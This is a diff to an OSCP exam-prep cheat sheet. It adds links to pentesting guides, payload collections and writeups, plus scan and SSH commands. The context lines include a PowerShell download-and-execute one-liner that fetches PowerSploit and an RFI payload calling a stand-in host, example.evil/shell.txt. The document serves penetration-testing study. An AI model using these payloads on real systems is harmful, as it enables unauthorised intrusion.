@@ -1,7 +1,10 @@
 # OSCP-shortsheet
 - 🚀 Prepared as part of my OSCP journey.
 
-#Resources
+# Guides
+- https://docs.gorigorisensei.com/tech-skills-needed/vim
+- https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e
+- https://www.geeksforgeeks.org/linux-commands/?ref=lbp
 - https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
 - https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket
 - https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
@@ -11,6 +14,30 @@
 - https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 - https://notes.benheater.com/books/network-pivoting/page/penetrating-networks-via-chisel-proxies
 - https://oscp.cyberdefendersprogram.com/oscp-the-exam    (msfvenom is allowed for unlimited use on the exam to create your reverse shell payloads (shell/reverse_tcp and shell_reverse_tcp))
+
+# resources
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
+- https://github.com/brianlam38/OSCP-2022/tree/main/Tools
+- https://book.jorianwoltjer.com/
+
+# AD specific resources
+- https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce#pass-the-hash
+- https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md
+- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/active_directory.md
+
+# Priesc specific resources
+- https://gist.github.com/ssstonebraker/fb2c43ad37a8a704bf952954ce95ec40
+- https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/
+- https://guide.offsecnewbie.com/privilege-escalation/linux-pe
+- https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e
+- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
+- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+- 
+
+# writeups
+- https://v3ded.github.io/categories/
+- https://0xdf.gitlab.io/
 
 # Table of Content
 - [Active Directory Pentesting](#active-directory-pentesting)
@@ -41,10 +68,14 @@ nmap -sS -Pn -n -A x.x.x.x
 sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
 nmap -SU -p- -- max-retries 0 -min-rate 500 x.x.x.x       #UDP scan
 
+#rustscan
+rustscan -a IP --ulimit 5000
+
 #powershell's port scan
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
 ```
-### Web scan
+
+### Web scan (80 - http or 443 - https)
 ```bash
 #Nikto
 nikto -h x.x.x.x
@@ -53,6 +84,7 @@ nikto -h x.x.x.x
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
 gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php
+gobuster dir -u https://10.129.168.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 #Wfuzz
 wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
@@ -68,7 +100,10 @@ wpscan --url https://x.x.x.x
 wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050.txt -- username admin -- threads 10
 ```
 
-### SMB Enumeration
+#### All other web apps
+- https://docs.gorigorisensei.com/web-apps 
+
+### SMB Enumeration (445 - SMB)
 - SMB can run: directly over TCP (port 445) OR via Netbios API (137/139)
 ```bash
 smbmap -H x.X.X.x
@@ -84,6 +119,9 @@ smbclient \\\\x.x.x.x\\share
 ```bash
 snmpwalk -c public -v1 x.x.x.x
 ```
+
+### any other protocol Emuneration
+- https://docs.gorigorisensei.com/ports-enum 
 
 ## Searching exploits
 ```bash
@@ -189,6 +227,7 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 ```
 
 ## Reverse Shell payload
+- https://www.revshells.com/ #Reverse Shell Generator
 - https://guide.offsecnewbie.com/shells
 - Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
 - If connections drops or can not be established, try different ports 80,443,8080...
@@ -1243,3 +1282,15 @@ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=
   - Users are allowed to create their own cron jobs
   - Only root can edit crontab for user
   - Cron job is private unlike /etc/crontab
+
+## starting and confirming SSH service
+```bash
+# To start it
+sudo systemctl start ssh
+
+#To confirm that the service is running
+sudo ss -antlp | grep sshd
+```
+
+## port forwarding
+- https://docs.gorigorisensei.com/port-forwarding
